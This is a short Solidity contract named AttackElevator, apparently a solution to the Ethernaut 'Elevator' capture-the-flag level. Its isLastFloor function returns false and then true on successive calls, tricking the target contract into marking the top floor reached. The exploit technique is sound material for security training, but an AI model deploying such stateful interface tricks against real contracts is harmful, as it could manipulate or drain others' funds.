//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Elevator} from "./Elevator.sol";

contract AttackElevator {
    Elevator public elevator;
    bool toggle = true;

    constructor(address _targetAdd) {
        elevator = Elevator(_targetAdd);
    }

    function attack(uint256 x) external {
        elevator.goTo(x);
    }

    function isLastFloor(uint256) public returns (bool) {
        if (toggle == true) {
            toggle = false;
            return false;
        } else {
            return true;
        }
    }
}
